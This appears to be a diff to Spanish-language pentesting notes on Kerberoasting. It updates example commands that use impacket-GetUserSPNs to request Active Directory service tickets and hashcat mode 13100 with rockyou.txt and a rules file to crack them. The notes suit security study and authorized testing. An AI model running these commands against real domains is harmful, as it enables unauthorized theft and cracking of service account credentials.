@@ -24,13 +24,13 @@ GetUserSPNs en Impacket: La funcionalidad GetUserSPNs se utiliza específicament
 ## Obtener Hash con Impacket-GetUsersSPNs
 
 ```bash 
-❯ impacket-GetUserSPNs domain.corp/user:Password     # Mirar si el usuario es Kerberosteable y listar los usuarios a los que se le puede solicitar un TGS
+❯ impacket-GetUserSPNs domain.corp/user:'P@$$w0rd123!'    # Mirar si el usuario es Kerberosteable y listar los usuarios a los que se le puede solicitar un TGS
 
-❯ impacket-GetUserSPNs domain1.corp/user:Password -dc-ip IP -request  
+❯ impacket-GetUserSPNs domain1.corp/user:'P@$$w0rd123!' -dc-ip IP -request  
 # Solicitar un TGS 
 
 # Solicitar varios TGS
-❯ impacket-GetUserSPNs domain1.corp/user:Password -dc-ip IP -request -outputfile kerb.txt  
+❯ impacket-GetUserSPNs domain1.corp/user:'P@$$w0rd123!' -dc-ip IP -request -outputfile kerb.txt  
 	
 	# dc-ip = Dirección IP del DC
 	# domain1 = Dominio 
@@ -46,8 +46,8 @@ Notas:
 
 ```bash 
 # Guardar y crackear el hash con 'Hashcat'
-❯ hashcat -m 13100 hash-kerberoasting /usr/share/wordlists/rockyou.txt --force
-❯ hashcat -m 13100 hash-kerberoasting /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force 
+❯ hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt --force
+❯ hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force 
 
 	# m = Método por fuerza bruta
 	# 13100 = TGS de un Kerberoasting
